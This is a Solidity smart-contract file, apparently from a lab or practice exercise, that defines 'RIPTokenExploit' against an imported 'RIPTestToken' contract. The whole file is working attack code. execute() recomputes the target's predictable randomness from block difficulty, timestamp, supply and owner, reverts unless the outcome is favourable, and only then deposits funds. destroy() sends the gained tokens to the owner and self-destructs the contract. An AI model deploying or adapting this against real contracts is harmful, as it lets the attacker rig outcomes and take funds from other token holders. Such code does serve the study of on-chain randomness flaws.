// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "./RIPToken.sol";

contract RIPTokenExploit is Ownable {
    RIPTestToken private ripToken;

    constructor(address ripTestTokenAddress) Ownable() payable {
        ripToken = RIPTestToken(payable(ripTestTokenAddress));
    }

    function execute() public onlyOwner {
        uint totalSupply = ripToken.totalSupply();
        uint r = (uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, totalSupply, ripToken.owner()))) % 100) + 1;
        require(r >= 90, "I want more RIPTestToken!!!");
        if (r >= 90) {
            ripToken.deposit{value: address(this).balance}();
        }
    }

    function destroy() public onlyOwner {
        ripToken.transfer(owner(), ripToken.balanceOf(address(this)));
        selfdestruct(payable(owner()));
    }
}
